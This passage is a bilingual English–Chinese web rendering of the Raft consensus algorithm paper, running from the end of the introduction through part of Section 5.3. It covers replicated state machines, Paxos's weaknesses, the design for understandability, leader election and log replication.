algorithms.</p><p>我们相信不论是用于教学还是作为系统实现的基础，Raft都要优于Paxos和其他的共识算法。它比其他算法更简单也更加易于理解；它能完全满足实际系统的需求；它有很多开源的实现并且被很多公司使用；它的安全性已经被完全证实了；并且它的效率也完全可以和其他算法相媲美。</p><p>The remainder of the paper introduces the replicated state machine problem (Section 2), discusses the strengths and weaknesses of Paxos (Section 3), describes our general approach to understandability (Section 4), presents the Raft consensus algorithm (Sections 5–8), evaluates Raft (Section 9), and discusses related work (Section 10).</p><p>本文的第2章介绍了状态机的相关问题，第3章描述了Paxos的优缺点，第4章介绍了我们达成可理解性目标的一些方法，第5到8章详细介绍了 Raft 共识算法，第9章描述了对Raft的评估，第10章讨论了Raft相关一些成果。</p><h2 id="2、复制状态机"><a href="#2、复制状态机" class="headerlink" title="2、复制状态机"></a>2、复制状态机</h2><p>Consensus algorithms typically arise in the context of replicated state machines [37]. In this approach, state machines on a collection of servers compute identical copies of the same state and can continue operating even if some of the servers are down. Replicated state machines are used to solve a variety of fault tolerance problems in distributed systems. For example, large-scale systems that have a single cluster leader, such as GFS [8], HDFS [38], and RAMCloud [33], typically use a separate replicated state machine to manage leader election and store configuration information that must survive leader crashes. Examples of replicated state machines include Chubby [2] and ZooKeeper [11].</p><p>共识算法是在复制状态机[37]的背景下提出来的。在这个方法中，一组服务器上的状态机对同一个状态计算并产生多个完全相同的副本，这使得即使其中一些服务器崩溃了，这组服务器也还可以继续正常运行。复制状态机通常用于解决分布式系统中容错相关的一系列问题。例如，GFS[8]，HDFS[38]， RAMCloud[33]，这些拥有单一集群领导者的大规模应用系统，会使用一个独立的复制状态机来管理领导选取及存储集群配置信息来应对领导者的崩溃。复制状态机典型的例子包括 Chubby[2] 和 ZooKeeper[11]。</p><div><p><img src="/assets/images/raft-repl-state-machine-architecture.png" alt="图 1 : 复制状态机架构" loading="lazy"></p></div><p>The consensus algorithm manages a replicated log containing state machine commands from clients. The state machines process identical sequences of commands from the logs, so they produce the same outputs.</p><p>共识算法管理着一个复制日志，其中包含来自客户端的状态机命令。状态机负责处理日志中相同的命令序列，因此它们会产生相同的输出。</p><p>Replicated state machines are typically implemented using a replicated log, as shown in Figure 1. Each server stores a log containing a series of commands, which its state machine executes in order. Each log contains the same commands in the same order, so each state machine processes the same sequence of commands. Since the state machines are deterministic, each computes the same state and the same sequence of outputs.</p><p>如图 1 所示，复制状态机通常使用复制日志来实现。每台服务器存储一份包含一系列命令的日志，内部状态机依照日志中的命令顺序执行。因为每台机器的状态机都是确定的，所以计算将得到同样的状态和输出结果。</p><p>Keeping the replicated log consistent is the job of the consensus algorithm. The consensus module on a server receives commands from clients and adds them to its log. It communicates with the consensus modules on other servers to ensure that every log eventually contains the same requests in the same order, even if some servers fail. Once commands are properly replicated, each server’s state machine processes them in log order, and the outputs are returned to clients. As a result, the servers appear to form a single, highly reliable state machine.</p><p>共识算法的任务就是保证复制日志的一致性。服务器上的共识模块，接收来自客户端的命令，并追加到日志中。它和其它服务器上的共识模块进行通信，确保每一个服务器上的日志都包含相同顺序的相同请求，即使其中的一些服务宕机了。一旦命令被正确地复制，每个服务器的状态机就会按日志顺序处理它们，并将输出返回给客户机。结果就是服务器似乎形成了一个单一的、高度可靠的状态机。</p><p>Consensus algorithms for practical systems typically have the following properties:</p><p>实际应用中的共识算法通常具有以下特性：</p><ul><li>They ensure safety (never returning an incorrect result) under all non-Byzantine conditions, including network delays, partitions, and packet loss, duplication, and reordering.</li><li>They are fully functional (available) as long as any majority of the servers are operational and can communicate with each other and with clients. Thus, a typical cluster of five servers can tolerate the failure of any two servers. Servers are assumed to fail by stopping; they may later recover from state on stable storage and rejoin the cluster.</li><li>They do not depend on timing to ensure the consistency of the logs: faulty clocks and extreme message delays can, at worst, cause availability problems.</li><li>In the common case, a command can complete as soon as a majority of the cluster has responded to a single round of remote procedure calls; a minority of slow servers need not impact overall system performance.</li></ul><br /><ul><li>确保非拜占庭情况下的安全性（从来不会返回一个错误的结果），包括网络的延迟、分区及数据包的丢包、冗余和乱序情况。</li><li>只要集群主体中的大多数机器能够运行，并且可以相互通信和与客户机通信，这个集群就可用。因此，一个拥有 5 台机器的集群最多可以容忍其中的 2 台的宕机。假定服务器因停止而发生了故障；它们可能稍后就会恢复稳定存储状态并重新加入集群。</li><li>不依赖于时间来确保日志的一致性：错误的时钟和极端的消息延迟在最坏的情况下会导致可用性的问题。</li><li>通常情况下，只要集群的大多数成员响应了一轮远程过程调用，命令就可以完成；少数慢速服务器不会影响总体的系统性能。</li></ul><h2 id="3、Paxos有什么问题？"><a href="#3、Paxos有什么问题？" class="headerlink" title="3、Paxos有什么问题？"></a>3、Paxos有什么问题？</h2><p>Over the last ten years, Leslie Lamport’s Paxos protocol [15] has become almost synonymous with consensus: it is the protocol most commonly taught in courses, and most implementations of consensus use it as a starting point. Paxos first defines a protocol capable of reaching agreement on a single decision, such as a single replicated log entry. We refer to this subset as single-decree Paxos. Paxos then combines multiple instances of this protocol to facilitate a series of decisions such as a log (multi-Paxos). Paxos ensures both safety and liveness, and it supports changes in cluster membership. Its correctness has been proven, and it is efficient in the normal case.</p><p>在过去的十年中，Leslie Lamport的Paxos协议[15]几乎成为了共识算法的代名词：它是授课中最常讲授的算法，同时也是许多共识算法实现的起点。Paxos首先定义了一个能够就单个决策达成一致的协议，例如单个复制的日志条目。我们将这个子集称为单一决策 Paxos。然后，Paxos将该协议的多个实例组合起来从而形成一系列决策，例如日志（multi-Paxos）。Paxos既保证了安全性又保证了活跃性，同时它支持集群成员角色的变更。它的正确性已被证明了并且在一般的情况下也被证明是高效的。</p><p>Unfortunately, Paxos has two significant drawbacks. The first drawback is that Paxos is exceptionally difficult to understand. The full explanation [15] is notoriously opaque; few people succeed in understanding it, and only with great effort. As a result, there have been several attempts to explain Paxos in simpler terms [16, 20, 21]. These explanations focus on the single-decree subset, yet they are still challenging. In an informal survey of attendees at NSDI 2012, we found few people who were comfortable with Paxos, even among seasoned researchers. We struggled with Paxos ourselves; we were not able to understand the complete protocol until after reading several simplified explanations and designing our own alternative protocol, a process that took almost a year.</p><p>不幸的是，Paxos有两个显著的缺点。<strong>第一个是 Paxos 太难以理解</strong>。众所周知，它的完整说明是出乎寻常的晦涩，很少有人能够完全理解它。因此，人们曾多次尝试用更简单的术语来解释Paxos[16，20，21]。虽然它们都侧重于single-decree subset的版本，但是仍然非常具有挑战性。在一项针对NSDI 2012与会者的非正式调查中，我们发现很少有人对Paxos感到舒服，即使是那些有着丰富经验的研究人员。我们自己也对Paxos感到非常痛苦，我们在阅读了几个简化版的描述以及设计了我们自己的替代协议后才能够理解完整的协议，而这整个过程持续了将近一年。</p><p>We hypothesize that Paxos’ opaqueness derives from its choice of the single-decree subset as its foundation. Single-decree Paxos is dense and subtle: it is divided into two stages that do not have simple intuitive explanations and cannot be understood independently. Because of this, it is difficult to develop intuitions about why the singledecree protocol works. The composition rules for multiPaxos add significant additional complexity and subtlety. We believe that the overall problem of reaching consensus on multiple decisions (i.e., a log instead of a single entry) can be decomposed in other ways that are more direct and obvious.</p><p>我们认为Paxos的晦涩来源于它将single-decree subset作为自己的基础。Single-decree Paxos被认为是微妙的：它被划分为两个阶段，它们没有简单直观的解释，也不能被独立理解。因此，这就导致了很难对single-decree协议是如何工作的进行联想。而multi-Paxos的组成规则（composition rule）则更加添加了复杂性。我们认为，就多项决策达成共识的总体问题（即，一个日志而不是一个条目）可以用其他更直接、更明显的方式来分解。</p><p>The second problem with Paxos is that it does not provide a good foundation for building practical implementations. One reason is that there is no widely agreedupon algorithm for multi-Paxos. Lamport’s descriptions are mostly about single-decree Paxos; he sketched possible approaches to multi-Paxos, but many details are missing. There have been several attempts to flesh out and optimize Paxos, such as [26], [39], and [13], but these differ from each other and from Lamport’s sketches. Systems such as Chubby [4] have implemented Paxos-like algorithms, but in most cases their details have not been published.</p><p>Paxos的第二个问题是<strong>它没有为构建实际的实现提供良好的基础</strong>。一大原因是multi-Paxos没有一个广受认可的算法。Lamport的描述主要针对的是single-decree Paxos；它为multi-Paxos提供了一个大概的框架，但是很多细节并没有提及。对于充实以及优化Paxos已经做了很多努力，例如[26]、[39]和[13]，但是它们各自之间，以及和Lamport的概述都不相同。像Chubby这样的系统已经实现了类Paxos算法，但是它的很多细节并没有公开。</p><p>Furthermore, the Paxos architecture is a poor one for building practical systems; this is another consequence of the single-decree decomposition. For example, there is little benefit to choosing a collection of log entries independently and then melding them into a sequential log; this just adds complexity. It is simpler and more efficient to design a system around a log, where new entries are appended sequentially in a constrained order. Another problem is that Paxos uses a symmetric peer-to-peer approach at its core (though it eventually suggests a weak form of leadership as a performance optimization). This makes sense in a simplified world where only one decision will be made, but few practical systems use this approach. If a series of decisions must be made, it is simpler and faster to first elect a leader, then have the leader coordinate the decisions.</p><p>此外，Paxos的架构也不利于构建实际系统；这是它按single-decree分解的另一个后果。例如，独立地选取一系列的日志条目并且将它们融合成一个顺序的日志并没有太多好处，仅仅只是增加了复杂度。相反，构建一个围绕按顺序扩展日志的系统是更简单和高效的。Paxos的另一个问题是它将对称的点对点（peer-to-peer）作为核心（虽然在最后为了优化性能建议了一种弱领导者形式）。这在只需要做一个决策的简单场景中是可行的，但是很少有实际的系统会使用这种方法。如果需要进行一系列的决策，那么先选择一个领导者，然后再让领导者去协调决策会更加简单快捷。</p><p>As a result, practical systems bear little resemblance to Paxos. Each implementation begins with Paxos, discovers the difficulties in implementing it, and then develops a significantly different architecture. This is timeconsuming and error-prone, and the difficulties of understanding Paxos exacerbate the problem. Paxos’ formulation may be a good one for proving theorems about its correctness, but real implementations are so different from Paxos that the proofs have little value. The following comment from the Chubby implementers is typical:</p><p>因此，实际构建出的系统与Paxos几乎没有相似之处。每个实现都从Paxos开始，然后发现实现起来很困难，于是最后开发出了一个完全不同的架构。这是极其费时并且容易出错的，而Paxos的难以理解则更加加剧了这个问题。Paxos的正确性理论很好证明，但是实际的实现和Paxos太过不同，因此这些证明就没什么价值了。接下来这段来自Chubby的评论是非常典型的：</p><ul><li>There are significant gaps between the description of the Paxos algorithm and the needs of a real-world system. . . . the final system will be based on an unproven protocol [4].</li></ul><br /><ul><li>Paxos算法的描述和现实世界的系统需求之间有着巨大的矛盾…而最终实现的系统都将建立在一个未经证明的协议之上[4]。</li></ul><p>Because of these problems, we concluded that Paxos does not provide a good foundation either for system building or for education. Given the importance of consensus in large-scale software systems, we decided to see if we could design an alternative consensus algorithm with better properties than Paxos. Raft is the result of that experiment.</p><p>因为这些问题的存在，我们得出这样的结论，Paxos并没有为实际系统的构建或者是教学提供一个很好的基础。基于在大规模软件系统中共识的重要性，我们决定尝试能否设计出另外一种比Paxos有着更好性质的共识算法。而Raft就是我们实验得到的结果。</p><h2 id="4、可理解性设计"><a href="#4、可理解性设计" class="headerlink" title="4、可理解性设计"></a>4、可理解性设计</h2><p>We had several goals in designing Raft: it must provide a complete and practical foundation for system building, so that it significantly reduces the amount of design work required of developers; it must be safe under all conditions and available under typical operating conditions; and it must be efficient for common operations. But our most important goal—and most difficult challenge—was understandability. It must be possible for a large audience to understand the algorithm comfortably. In addition, it must be possible to develop intuitions about the algorithm, so that system builders can make the extensions that are inevitable in real-world implementations.</p><p>我们在设计Raft的时候有以下几个目标：它必须为系统构建提供一个完整并实际可行的基础，这将大大减少系统开发者的设计工作；它必须在任何情况下都能够确保安全性，并且保证在典型应用场景下的可用性；它在通常的应用操作中必须是高效的。另外，最重要的一点，也是最具挑战性的一点是它必须易于理解，从而使广大的读者能够很好的理解这个算法。 并且要能够培养出对这个算法的直觉（develop intuitions），从而让系统构建者能够在实际实现中做出必要的扩展。</p><p>There were numerous points in the design of Raft where we had to choose among alternative approaches. In these situations we evaluated the alternatives based on understandability: how hard is it to explain each alternative (for example, how complex is its state space, and does it have subtle implications?), and how easy will it be for a reader to completely understand the approach and its implications?</p><p>在设计Raft的很多节点上，我们需要在很多可选方法之间做出选择。在这些情况下，我们基于可理解性来评估这些方法：每一个可选方案的描述是否困难（比如，它的状态空间的复杂度是多少，以及它是否有其他的理解歧义？）以及读者是否能轻松地完全理解这种方法。</p><p>We recognize that there is a high degree of subjectivity in such analysis; nonetheless, we used two techniques that are generally applicable. The first technique is the well-known approach of problem decomposition: wherever possible, we divided problems into separate pieces that could be solved, explained, and understood relatively independently. For example, in Raft we separated leader election, log replication, safety, and membership changes.</p><p>后来我们意识到这种分析方法具有很强的主观性；于是我们使用了两种方法让分析变得更具通用性。<strong>第一种是众所周知的问题分解方法：在可能的情况下，我们将问题划分为可以相对独立地解决、解释和理解的部分。</strong> 例如，在Raft中，我们分离了领导者选举、日志复制、安全性和成员变更。</p><p>Our second approach was to simplify the state space by reducing the number of states to consider, making the system more coherent and eliminating nondeterminism where possible. Specifically, logs are not allowed to have holes, and Raft limits the ways in which logs can become inconsistent with each other. Although in most cases we tried to eliminate nondeterminism, there are some situations where nondeterminism actually improves understandability. In particular, randomized approaches introduce nondeterminism, but they tend to reduce the state space by handling all possible choices in a similar fashion (“choose any; it doesn’t matter”). We used randomization to simplify the Raft leader election algorithm.</p><p>我们的<strong>第二种方法是通过减少要考虑的状态来简化状态空间，使系统更加一致，并且在可能的情况下消除不确定性。</strong> 具体来说，日志不允许存在空洞，Raft限制了日志之间存在不一致的可能。尽管在大多数情况下，我们试图消除不确定性，但在某些情况下，不确定性实际上提高了可理解性。特别是随机化方法引入了不确定性，但是它们倾向于通过以类似的方式处理所有可能的选择来减少状态空间（选择哪一个并不重要）。我们使用随机化来简化了Raft的领导者选举算法。</p><h2 id="5、Raft公式算法"><a href="#5、Raft公式算法" class="headerlink" title="5、Raft公式算法"></a>5、Raft公式算法</h2><p>Raft is an algorithm for managing a replicated log of the form described in Section 2. Figure 2 summarizes the algorithm in condensed form for reference, and Figure 3 lists key properties of the algorithm; the elements of these figures are discussed piecewise over the rest of this section.</p><p>Raft是用于管理文章第二部分描述的复制日志算法。图2是对Raft的简要描述；图3罗列了算法的一些重要属性；接下来将会对图示部分进行分段讨论。</p><div><p><img src="/assets/images/raft-state.png" alt="State" loading="lazy"></p></div><div><p><img src="/assets/images/raft-request-vote-rpc.png" alt="RequestVote RPC" loading="lazy"></p></div><div><p><img src="/assets/images/raft-rule-for-servers.png" alt="Rules For Servers" loading="lazy"></p></div><p>Figure 2: A condensed summary of the Raft consensus algorithm (excluding membership changes and log compaction). The server behavior in the upper-left box is described as a set of rules that trigger independently and repeatedly. Section numbers such as §5.2 indicate where particular features are discussed. A formal specification [31] describes the algorithm more precisely.</p><p>图2：Raft共识算法的简明摘要（不包括成员变更和日志压缩）。左上框中的服务器行为被描述为一组独立且可重复触发的规则。例如第5.2节指明讨论特定特征的位置。形式规范[31]更精确地描述了该算法。</p><div><p><img src="/assets/images/raft-properties.png" alt="Raft Properties" loading="lazy"></p></div><p>Figure 3: Raft guarantees that each of these properties is true at all times. The section numbers indicate where each property is discussed.</p><p>图3：Raft保证这些属性在任何时候都是正确的。章节号是讨论每个属性的位置。</p><p>Raft implements consensus by first electing a distinguished leader, then giving the leader complete responsibility for managing the replicated log. The leader accepts log entries from clients, replicates them on other servers, and tells servers when it is safe to apply log entries to their state machines. Having a leader simplifies the management of the replicated log. For example, the leader can decide where to place new entries in the log without consulting other servers, and data flows in a simple fashion from the leader to other servers. A leader can fail or become disconnected from the other servers, in which case a new leader is elected.</p><p>Raft首先选举出一个唯一的领导者来实现共识，并赋予完全的管理复制日志的责任。领导者接收来自客户端的日志条目并复制到其它服务器，同时将日志条目追加到自身日志，然后告知其他服务器可以应用日志条目到状态机。领导者大大简化了日志复制的管理。例如，领导者可以自主决定日志条目的追加位置，数据以一种简单的方式从领导者流向其它服务器。领导者可能会宕机或与其他服务器断开连接，在这种情况下，将要选出新的领导者。</p><p>Given the leader approach, Raft decomposes the consensus problem into three relatively independent subproblems, which are discussed in the subsections that follow:</p><p>鉴于领导者方法，Raft将共识问题分解为三个相对独立的子问题，这些子问题将在下面的小节中讨论：</p><ul><li>Leader election: a new leader must be chosen when an existing leader fails (Section 5.2).</li><li>Log replication: the leader must accept log entries from clients and replicate them across the cluster, forcing the other logs to agree with its own (Section 5.3).</li><li>Safety: the key safety property for Raft is the State Machine Safety Property in Figure 3: if any server has applied a particular log entry to its state machine, then no other server may apply a different command for the same log index. Section 5.4 describes how Raft ensures this property; the solution involves an additional restriction on the election mechanism described in Section 5.2.</li></ul><br /><ul><li><strong>领导者选举</strong>：现有的领导者宕机后将选举新的领导者（第5.2节）。</li><li><strong>日志复制</strong>：领导者必须能够接受来自客户端的日志条目，并复制到集群中的其它服务器，强制其他服务器的日志与自己的日志保持一致（第5.3节）。</li><li><strong>安全性</strong>：Raft的关键安全性属性是图3中的状态机的安全性属性：如果任何服务器已将特定的日志条目应用于其状态机，那么其他服务器都不能对同一个日志索引应用不同的命令。第5.4节描述了Raft如何确保该特性；解决方案中包括了对第5.2节所述选举机制的额外限制。</li></ul><p>After presenting the consensus algorithm, this section discusses the issue of availability and the role of timing in the system.</p><p>在介绍了共识算法之后，本节讨论了可用性问题以及时机（the role of timing）在系统中的作用。</p><h3 id="5-1、Raft基础"><a href="#5-1、Raft基础" class="headerlink" title="5.1、Raft基础"></a>5.1、Raft基础</h3><p>A Raft cluster contains several servers; five is a typical number, which allows the system to tolerate two failures. At any given time each server is in one of three states: leader, follower, or candidate. In normal operation there is exactly one leader and all of the other servers are followers. Followers are passive: they issue no requests on their own but simply respond to requests from leaders and candidates. The leader handles all client requests (if a client contacts a follower, the follower redirects it to the leader). The third state, candidate, is used to elect a new leader as described in Section 5.2. Figure 4 shows the states and their transitions; the transitions are discussed below.</p><p>一个 Raft 集群包括若干个服务器；对于一个典型的拥有 5 个服务器的集群来说，最多能够容忍 2 台服务器宕机。集群运行期间，服务器都会处于三个状态之中：领导者（Leader） 、跟随者（Follower）、候选者（Candidate）。正常情况下，只有一个服务器处于领导者状态，其它的都是跟随者。跟随者是被动的：他们不发送任何请求，只是简单的响应来自领导者和候选者的请求。领导者来处理所有来自客户端的请求（如果一个客户端与跟随者进行通信，跟随者会将请求信息转发给领导者）。候选者是用来选取新的领导者的。图-4 阐述了这些状态及它们之间的转换。</p><div><p><img src="/assets/images/raft-server-states.png" alt="Raft Server States" loading="lazy"></p></div><p>Figure 4: Server states. Followers only respond to requests from other servers. If a follower receives no communication, it becomes a candidate and initiates an election. A candidate that receives votes from a majority of the full cluster becomes the new leader. Leaders typically operate until they fail.</p><p>图4：服务器状态。跟随者只响应来自其他服务器的请求。如果一个追随者没有收到任何信息，它就会成为一个候选人并发起选举。一个获得集群中多数选票的候选者会成为新的领导者。领导者通常会一直工作直到宕机。</p><p>Raft divides time into terms of arbitrary length, as shown in Figure 5. Terms are numbered with consecutive integers. Each term begins with an election, in which one or more candidates attempt to become leader as described in Section 5.2. If a candidate wins the election, then it serves as leader for the rest of the term. In some situations an election will result in a split vote. In this case the term will end with no leader; a new term (with a new election) will begin shortly. Raft ensures that there is at most one leader in a given term.</p><p>Raft将时间划分为任意长度的任期（Term），如图5所示。任期用连续的整数来命名。每一个任期的选举开始时，一名或多名候选者会试图成为第5.2节所述的领导者。如果候选者在选举中获胜，那么它将在余下的任期内担任领导者。在某些情况下，选举会导致分裂投票。在这种情况下，任期将以无领导者而结束；新的任期会随即开始。Raft确保在给定的任期内最多有一个领导者。</p><div><p><img src="/assets/images/raft-terms.png" alt="Raft Terms" loading="lazy"></p></div><p>Figure 5: Time is divided into terms, and each term begins with an election. After a successful election, a single leader manages the cluster until the end of the term. Some elections fail, in which case the term ends without choosing a leader. The transitions between terms may be observed at different times on different servers.</p><p>图5：时间被划分为任期，每届任期以选举开始。在一次成功的选举之后，只有一位领导者能够管理这个集群直到任期结束。在某些选举失败的情况下，任期结束时没有选出领导者。可以在不同的服务器上，在不同的时间段内观察转换过程。</p><p>Different servers may observe the transitions between terms at different times, and in some situations a server may not observe an election or even entire terms. Terms act as a logical clock [14] in Raft, and they allow servers to detect obsolete information such as stale leaders. Each server stores a current term number, which increases monotonically over time. Current terms are exchanged whenever servers communicate; if one server’s current term is smaller than the other’s, then it updates its current term to the larger value. If a candidate or leader discovers that its term is out of date, it immediately reverts to follower state. If a server receives a request with a stale term number, it rejects the request.</p><p>可以观察到不同的服务器会在不同的时间进行任期（Term）的转换。在某些情况下，甚至在整个任期中，服务器可能不会观察到选举。任期（Term）作为Raft的逻辑时钟[14]，它们允许服务器检测过期的信息，例如过期的领导者。每个服务器都存储着一个当前任期数字，数字随任期单调递增，服务器间通信时会相互交换任期信息。如果一个服务器的任期信息比其它的服务器小，它就会更新自己的任期到当前较大的任期。如果领导者或者候选者发现自己的任期信息已经过期，那么它们会立即转换状态为跟随者。当一个服务器收到一个包含过期的任期信息的请求时，会拒绝这个请求。</p><p>Raft servers communicate using remote procedure calls (RPCs), and the basic consensus algorithm requires only two types of RPCs. RequestVote RPCs are initiated by candidates during elections (Section 5.2), and AppendEntries RPCs are initiated by leaders to replicate log entries and to provide a form of heartbeat (Section 5.3). Section 7 adds a third RPC for transferring snapshots between servers. Servers retry RPCs if they do not receive a response in a timely manner, and they issue RPCs in parallel for best performance.</p><p>Raft服务器间通过RPC方式进行通信，基础的共识算法只需要两种类型的RPC：<strong>请求投票RPCs（RequestVote RPCs）</strong> 是候选者在选举期间发起的，并在选举时使用（第5.2节）和  <strong>复制日志条目 RPCs（Append Entries RPCs）</strong>  是由领导者发起的，在复制日志及心跳检测时使用（第5.3节）。第7节中新增了用于 <strong>在服务器之间传输快照的第三个RPC</strong>。如果服务器没有及时收到响应，则会重试RPC，通过并行发出RPC以获得最佳性能。</p><h3 id="5-2、领导者选举"><a href="#5-2、领导者选举" class="headerlink" title="5.2、领导者选举"></a>5.2、领导者选举</h3><p>Raft uses a heartbeat mechanism to trigger leader election. When servers start up, they begin as followers. A server remains in follower state as long as it receives valid RPCs from a leader or candidate. Leaders send periodic heartbeats (AppendEntries RPCs that carry no log entries) to all followers in order to maintain their authority. If a follower receives no communication over a period of time called the election timeout, then it assumes there is no viable leader and begins an election to choose a new leader.</p><p>Raft使用心跳机制来触发领导者选举。当服务器启动时，它们会处于跟随者的状态。并且保持这种状态直到接收到来自领导者或者候选者的合法RPCs。领导者会定期向所有追随者发送心跳信号（AppendEntries RPCs 是不携带日志条目的RPC），以保持它们的领导者地位。如果一个跟随者在选举超时的时间内没有收到任何通信，那么它就假定没有有效的领导者，并开始新一轮的选举以选择出新的领导人。</p><p>To begin an election, a follower increments its current term and transitions to candidate state. It then votes for itself and issues RequestVote RPCs in parallel to each of the other servers in the cluster. A candidate continues in this state until one of three things happens: (a) it wins the election, (b) another server establishes itself as leader, or © a period of time goes by with no winner. These outcomes are discussed separately in the paragraphs below.</p><p>为了开始进行选举，跟随者会增加其当前任期并切换到候选者状态。然后它为自己投票，并向集群中的其他服务器并行发出请求投票请求（RequestVote RPCs）。<strong>候选者会一直保持自身状态，直到以下三种情况中的任何一种发生：（a）它赢得了选举，成为了领导者（b）其他候选者赢得了领导者的地位，（c）选举超时，未能成功的选出领导者。这些结果将在下文各段中单独讨论。</strong></p><p>A candidate wins an election if it receives votes from a majority of the servers in the full cluster for the same term. Each server will vote for at most one candidate in a given term, on a first-come-first-served basis (note: Section 5.4 adds an additional restriction on votes). The majority rule ensures that at most one candidate can win the election for a particular term (the Election Safety Property in Figure 3). Once a candidate wins an election, it becomes leader. It then sends heartbeat messages to all of the other servers to establish its authority and prevent new elections.</p><p>如果候选者在同一任期内收到来自整个集群中大多数服务器的投票，那么它将赢得选举。每个服务器都按照先到先服务的原则投出它有且仅有一个的选票。多数原则确保了在特定的任期内最多有一个候选者能够赢得选举（图3中的选举安全属性）。一旦候选者赢得选举，它就成为了领导者。然后，它向其他的所有服务器发送心跳消息，告知自身的领导者状态并阻止新的选举。</p><p>While waiting for votes, a candidate may receive an AppendEntries RPC from another server claiming to be leader. If the leader’s term (included in its RPC) is at least as large as the candidate’s current term, then the candidate recognizes the leader as legitimate and returns to follower state. If the term in the RPC is smaller than the candidate’s current term, then the candidate rejects the RPC and continues in candidate state.</p><p>在等待投票时，候选者可能会收到其他声称是领导者的复制日志条目 RPC（ AppendEntries RPC）。如果领导者的任期（被包含在它的RPC请求中）和候选者的当前任期相同（或者大于候选者的任期），那么候选者就承认领导者是合法的，并且从候选者状态转换成跟随者的状态。如果RPC请求中的任期信息小于当前候选者的任期，当前候选者则会拒绝该RPC并且继续处于候选者状态。</p><p>The third possible outcome is that a candidate neither wins nor loses the election: if many followers become candidates at the same time, votes could be split so that no candidate obtains a majority. When this happens, each candidate will time out and start a new election by incrementing its term and initiating another round of RequestVote RPCs. However, without extra measures split votes could repeat indefinitely.</p><p>第三种可能的结果是候选者既没有赢得选举也没有输掉选举：如果很多跟随者同时成为候选者，选票就可能会被分割，最终可能是没有候选者获得多数票。当这种情况发生时，每一位候选者都将进入选举超时状态，之后通过增加它们的任期和发送新一轮的请求投票RPCs（RequestVote RPCs）来发起新一轮的选举。然而，如果不采用额外的措施，分裂的投票（split votes）将会无限的重复。</p><p>Raft uses randomized election timeouts to ensure that split votes are rare and that they are resolved quickly. To prevent split votes in the first place, election timeouts are chosen randomly from a fixed interval (e.g., 150–300ms). This spreads out the servers so that in most cases only a single server will time out; it wins the election and sends heartbeats before any other servers time out. The same mechanism is used to handle split votes. Each candidate restarts its randomized election timeout at the start of an election, and it waits for that timeout to elapse before starting the next election; this reduces the likelihood of another split vote in the new election. Section 9.3 shows that this approach elects a leader rapidly.</p><p>Raft使用随机的选举超时时间来确保分裂投票（split votes）很少发生，或者即使发生了也能很快的被解决。为了在一开始就避免分裂投票的发生，选举超时时间被设定为一个固定范围（例如150-300毫秒）中的随机值。这就能够使服务器很好的分散开来，确保在大多数场景下只会有一个服务器发生选举超时；当一个服务器赢得选举后，它能够在其他服务器选举超时之前向它们发送心跳信息。每一个候选者在选举开始时会重置一个随机的选举超时时间，然后等待超时时间的带来，之后再重新启动下一轮的选举，这就大大减少了下一次选举时分裂投票的情况发生。第9.3节表明，这种方法能够快速的选举出领导者。</p><p>Elections are an example of how understandability guided our choice between design alternatives. Initially we planned to use a ranking system: each candidate was assigned a unique rank, which was used to select between competing candidates. If a candidate discovered another candidate with higher rank, it would return to follower state so that the higher ranking candidate could more easily win the next election. We found that this approach created subtle issues around availability (a lower-ranked server might need to time out and become a candidate again if a higher-ranked server fails, but if it does so too soon, it can reset progress towards electing a leader). We made adjustments to the algorithm several times, but after each adjustment new corner cases appeared. Eventually we concluded that the randomized retry approach is more obvious and understandable.</p><p>选举这一个例子很好的说明了我们是如何根据可理解性做出设计选择的。设计之初，我们计划使用一个排名系统，每个候选者被分配一个唯一的排名，以用于候选者之间的竞争。如果一个候选者发现了另一个排名更高的候选者则会返回到跟随者状态，这样级别更高的候选者就可以很容易的赢得下一次选举。但是我们发现这种方法在可用性方面有一些小问题（当排名较高的服务器选举失败后，排名较低的服务器会等待选举超时的到来然后再次成为候选者，并开始新一轮的选举，但是如果排名较高的服务器又很快就失败了，那这就会影响领导者选举的进度）。我们对算法进行了很多次的调整，但每一次的调整都会引入新的问题。最终我们得出结论，随机重试这种方法更明确，也更易于理解。</p><h3 id="5-3、日志复制"><a href="#5-3、日志复制" class="headerlink" title="5.3、日志复制"></a>5.3、日志复制</h3><p>Once a leader has been elected, it begins servicing client requests. Each client request contains a command to be executed by the replicated state machines. The leader appends the command to its log as a new entry, then issues AppendEntries RPCs in parallel to each of the other servers to replicate the entry. When the entry has been safely replicated (as described below), the leader applies the entry to its state machine and returns the result of that execution to the client. If followers crash or run slowly, or if network packets are lost, the leader retries AppendEntries RPCs indefinitely (even after it has responded to the client) until all followers eventually store all log entries.</p><p>一旦一个领导者被选出，它就开始接受处理客户端的请求。每个客户端的请求都会包含一条需要状态机执行的命令。领导者将命令作为一个新条目追加到自身的日志中，然后并行的发送追加条目RPCs（AppendEntries RPCs）到其他的服务器进行日志条目的复制。当条目被安全的复制（如下所述）后，领导者将该条目应用于其状态机，并将执行结果返回给客户端。如果跟随者发生宕机，运行缓慢或网络数据包丢失等情况，领导者会无限次的重试发送AppendEntries RPCs，直到所有的跟随者都成功复制了所有的日志条目。</p><div><p><img src="/assets/images/raft-logs.png" alt="Raft Logs" loading="lazy"></p></div><p>Figure 6: Logs are composed of entries, which are numbered sequentially. Each entry contains the term in which it was created (the number in each box) and a command for the state machine. An entry is considered committed if it is safe for that entry to be applied to state machines.</p><p>图6：日志由按顺序编号的条目组成。每个条目在被创建时都包含一个任期（term）（每个框中的数字）和一个状态机的命令。如果该条目可以安全地应用于状态机，则该条目被视为已提交。</p><p>Logs are organized as shown in Figure 6. Each log entry stores a state machine command along with the term number when the entry was received by the leader. The term numbers in log entries are used to detect inconsistencies between logs and to ensure some of the properties in Figure 3. Each log entry also has an integer index identifying its position in the log.</p><p>日志的存储形式如上图6所示。每个日志条目都存储着一条状态机命令和一个领导者接受条目时的任期号。日志条目中的任期号主要用于检测日志之间的不一致性，并确保图3中的某些属性。每一个日志条目都有一个整数索引，用于标识其在日志中的存储位置。</p><p>The leader decides when it is safe to apply a log entry to the state machines; such an entry is called committed. Raft guarantees that committed entries are durable and will eventually be executed by all of the available state machines. A log entry is committed once the leader that created the entry has replicated it on a majority of the servers (e.g., entry 7 in Figure 6). This also commits all preceding entries in the leader’s log, including entries created by previous leaders. Section 5.4 discusses some subtleties when applying this rule after leader changes, and it also shows that this definition of commitment is safe. The leader keeps track of the highest index it knows to be committed, and it includes that index in future AppendEntries RPCs (including heartbeats) so that the other servers eventually find out. Once a follower learns that a log entry is committed, it applies the entry to its local state machine (in log 